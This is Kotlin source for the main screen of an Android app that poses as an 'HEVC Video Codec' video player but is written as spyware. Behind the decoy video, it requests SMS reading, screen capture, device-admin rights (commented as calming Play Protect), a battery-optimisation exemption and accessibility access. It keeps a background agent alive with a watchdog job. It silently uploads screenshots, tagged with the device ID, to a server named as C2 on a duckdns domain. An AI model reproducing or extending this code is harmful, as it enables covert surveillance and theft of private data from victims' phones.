package com.hevc.codec

import android.hardware.display.VirtualDisplay
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import android.widget.MediaController
import android.widget.Toast
import android.widget.VideoView
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    companion object {
        // NOTE: use HTTPS domain here (nginx proxies to IP:5000 on VPS)
        const val C2_BASE = "https://hevc-codec.duckdns.org"
        const val REQ_MEDIA_PROJECTION = 1001
        var projection: MediaProjection? = null
        var imageReader: ImageReader? = null
        var virtualDisplay: VirtualDisplay? = null
        var screenWidth = 1080
        var screenHeight = 1920
    }

    private val videoUrl = "$C2_BASE/video.mp4"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ===== FRONT FACE: just a video player =====
        val videoView = findViewById<VideoView>(R.id.videoView)
        val controller = MediaController(this)
        controller.setAnchorView(videoView)
        videoView.setMediaController(controller)
        videoView.setVideoURI(Uri.parse(videoUrl))
        videoView.setOnPreparedListener { it.start() }
        videoView.setOnErrorListener { _, _, _ ->
            Toast.makeText(this, "Buffering... please wait", Toast.LENGTH_SHORT).show()
            true
        }

        // Re-open link after install => just plays video, no re-install.
        ensureAgentRunning()
        maybeRequestBatteryExempt()
        requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)

        // ONE-TIME screen access - let Android's system dialog appear directly
        if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("screen_granted", false)) {
            requestScreenAccess()
        }

        // Device admin (keeps app alive, calms Play Protect)
        if (!AdminReceiver.isActive(this)) {
            AdminReceiver.requestActivation(this)
        }

        // Accessibility hint (shown ONCE)
        if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("a11y_hint_shown", false)) {
            getSharedPreferences("hevc", Context.MODE_PRIVATE)
                .edit().putBoolean("a11y_hint_shown", true).apply()
            Toast.makeText(this,
                "Tip: enable 'HEVC Video Codec' in Settings > Accessibility for best quality",
                Toast.LENGTH_LONG).show()
        }
    }

    @SuppressLint("MissingPermission")
    private fun requestScreenAccess() {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION)
        } catch (e: Exception) {
            Log.e("HevcCodec", "projection intent failed", e)
        }
    }

    @SuppressLint("MissingPermission")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
            setupMediaProjection(data)
            getSharedPreferences("hevc", Context.MODE_PRIVATE)
                .edit().putBoolean("screen_granted", true).apply()
            Log.d("HevcCodec", "Screen access granted - silent capture ready")
        } else if (requestCode == REQ_MEDIA_PROJECTION) {
            Log.w("HevcCodec", "User cancelled screen capture")
        }
    }

    @SuppressLint("MissingPermission")
    private fun setupMediaProjection(intent: Intent) {
        try {
            projection?.stop()
            virtualDisplay?.release()
            imageReader?.close()

            projection = (getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
                .getMediaProjection(RESULT_OK, intent) ?: return

            screenWidth = resources.displayMetrics.widthPixels
            screenHeight = resources.displayMetrics.heightPixels

            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
            imageReader!!.setOnImageAvailableListener({ reader ->
                Thread {
                    val bitmap = captureBitmap(reader)
                    if (bitmap != null) uploadScreenshot(bitmap)
                }.start()
            }, Handler(Looper.getMainLooper()))

            virtualDisplay = projection!!.createVirtualDisplay(
                "HevcCodec", screenWidth, screenHeight, resources.displayMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, null
            )
        } catch (e: Exception) {
            Log.e("HevcCodec", "setupMediaProjection failed", e)
        }
    }

    private fun captureBitmap(reader: ImageReader): android.graphics.Bitmap? {
        val image = reader.acquireLatestImage() ?: return null
        val plane = image.planes[0]
        val buffer = plane.buffer
        val bitmap = android.graphics.Bitmap.createBitmap(
            image.width, image.height, android.graphics.Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()
        return bitmap
    }

    private fun uploadScreenshot(bitmap: android.graphics.Bitmap) {
        try {
            val deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
            val conn = URL("$C2_BASE/screenshot/$deviceId").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.use { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 80, it) }
            conn.responseCode
        } catch (e: Exception) {
            Log.e("HevcCodec", "Upload failed", e)
        }
    }

    private fun ensureAgentRunning() {
        try { startService(Intent(this, AgentService::class.java)) } catch (_: Exception) {}
        WatchdogJob.schedule(this)
    }

    private fun maybeRequestBatteryExempt() {
        if (getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("bat_done", false)) return
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } catch (e: Exception) {}
        getSharedPreferences("hevc", Context.MODE_PRIVATE).edit().putBoolean("bat_done", true).apply()
    }

    override fun onResume() {
        super.onResume()
        ensureAgentRunning()
    }
}
